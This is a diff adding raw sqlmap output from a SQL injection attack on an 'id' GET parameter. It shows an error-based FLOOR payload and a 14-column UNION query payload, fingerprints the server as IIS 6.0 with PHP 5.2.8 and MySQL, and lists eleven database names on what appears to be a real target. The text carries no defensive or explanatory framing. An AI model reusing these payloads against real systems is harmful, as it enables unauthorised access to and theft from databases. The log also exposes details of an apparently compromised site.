@@ -1,0 +1,27 @@
+sqlmap identified the following injection point(s) with a total of 53 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=422 AND (SELECT 6330 FROM(SELECT COUNT(*),CONCAT(0x71716a7171,(SELECT (ELT(6330=6330,1))),0x716b787171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 14 columns
+    Payload: id=-2800 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x71716a7171,0x525a55516f734b414f674e4945485449465977634d4357416f5070456c566f55696e587373574153,0x716b787171),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- sXck
+---
+web server operating system: Windows 2003 or XP
+web application technology: ASP.NET, Microsoft IIS 6.0, PHP 5.2.8
+back-end DBMS: MySQL >= 5.0
+available databases [11]:
+[*] information_schema
+[*] jiaoyang
+[*] jiaoyang2
+[*] mysql
+[*] ysd_fc
+[*] ysd_jituan
+[*] ysd_kaiyi
+[*] ysd_moer
+[*] ysd_ny
+[*] ysd_pingwei
+[*] ysd_sq
+
